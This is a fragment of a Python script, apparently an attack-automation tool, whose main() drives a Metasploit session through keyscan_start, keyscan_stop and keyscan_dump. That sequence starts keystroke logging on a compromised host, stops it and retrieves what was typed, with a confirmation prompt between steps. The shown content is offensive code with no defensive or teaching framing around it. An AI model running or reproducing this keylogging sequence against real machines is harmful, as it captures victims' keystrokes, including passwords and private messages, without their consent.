...
async def main():
    ...
    metasploit_executor.keyscan_start(metasploit_sessionid)
    print_status_message("Command execution completed!", status="success")

    confirm_action("Confirm execution of the next step?")

    metasploit_executor.keyscan_stop(metasploit_sessionid)
    print_status_message("Command execution completed!", status="success")

    confirm_action("Confirm execution of the next step?")

    metasploit_executor.keyscan_dump(metasploit_sessionid)
    print_status_message("Command execution completed!", status="success")
